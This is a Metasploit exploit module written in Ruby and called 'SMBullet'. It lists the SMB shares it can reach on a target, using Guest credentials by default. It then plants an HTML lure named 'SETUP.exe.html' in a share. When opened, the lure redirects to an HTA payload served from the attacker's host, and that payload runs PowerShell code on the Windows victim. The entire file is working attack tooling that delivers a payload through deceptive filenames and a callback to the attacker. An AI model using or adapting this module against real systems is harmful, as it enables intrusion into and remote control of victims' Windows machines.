class MetasploitModule < Msf::Exploit::Remote
  Rank = GoodRanking
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::SMB::Client
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'hta Payload Delivery Service (SMBullet) via file transfer to accessible SMB shares.',
      'Authors'        => 'Bien, Borromeo, Del Rosario, Fulcher',
      'License'        => MSF_LICENSE,
      'Derived From'   => [['CVE', '2017-11882'], ['URL', 'https://github.com/embedi/CVE-2017-11882/']],
      'Platform'       => 'win',
      'Targets'        => [['Microsoft’s HTML Application Host', {}]],
      'DefaultOptions' => {'DisablePayloadHandler' => false, 'URIPATH' => 'RUNME.exe.hta'},
      'DefaultTarget'  => 0
    ))
    register_options([
      OptString.new('FILENAME', [true, 'The html filename', 'SETUP.exe.html']),
      OptString.new('SMB_SHARE', [false, 'The SMB share to connect to', '']),
      OptString.new('SMBUser', [false, 'The SMB user in the target ("Guest" by default)', 'Guest']),
      OptString.new('SMBPass', [false, 'The password for the specified SMB user (None by default)', '']),
      OptString.new('LHOST', [true, 'The localhost IP'])
    ])
  end

  def create_html_file
    scheme = datastore['SSL'] ? 'https' : 'http'
    host = datastore['LHOST']
    hta_uri = "#{scheme}://#{host}:#{datastore['SRVPORT']}#{'/' + datastore['URIPATH']}"
    "<html><body><script>window.location.href='#{hta_uri}';</script></body></html>"
  end

  def list_accessible_shares
    connect
    smb_login
    shares = simple.client.net_share_enum_all(rhost)
    shares.each do |share|
      next if ['IPC$', 'ADMIN$', 'C$'].include?(share[:name])
      print_good("Accessible SMB Share: #{share[:name]}")
    end
    disconnect
  rescue => e
    print_error("ERROR: Failed to list shares: #{e.message}")
  end

  def on_request_uri(cli, req)
    print_status("Delivering HTA Payload")
    hta_payload = regenerate_payload(cli)
    hta_data = Msf::Util::EXE.to_executable_fmt(framework, ARCH_X86, 'win', hta_payload.encoded, 'hta-psh', { :arch => ARCH_X86, :platform => 'win' })
    send_response(cli, hta_data, 'Content-Type' => 'application/hta')
  end

  def upload_via_smb(html_content)
    filename = datastore['FILENAME']
    smb_share = datastore['SMB_SHARE']
    if smb_share.empty?
      print_error("SMB_SHARE is not set, cannot send the html file")
      return
    end
    begin
      connect
      smb_login
      print_status("Connected to SMB server: #{smb_share}")
      filepath = "#{filename}"
      print_status("Sending #{filepath}")
      tree = simple.client.tree_connect("\\\\#{rhost}\\#{smb_share}")
      file_obj = tree.open_file(filename: filepath, write: true, disposition: RubySMB::Dispositions::FILE_OVERWRITE_IF)
      file_obj.write(data: html_content) unless html_content.empty?
      file_obj.close
      print_good("Success! Sent #{filename} to #{smb_share}")
    rescue RubySMB::Error => e
      print_error("ERROR: Failed to send file: #{e.message}")
    ensure
      disconnect
    end
  end

  def exploit
    list_accessible_shares
    smb_share = datastore['SMB_SHARE']
    html_file = create_html_file
    print_status("SMBullet (html) generated!")
    upload_via_smb(html_file)
    super
  end
end
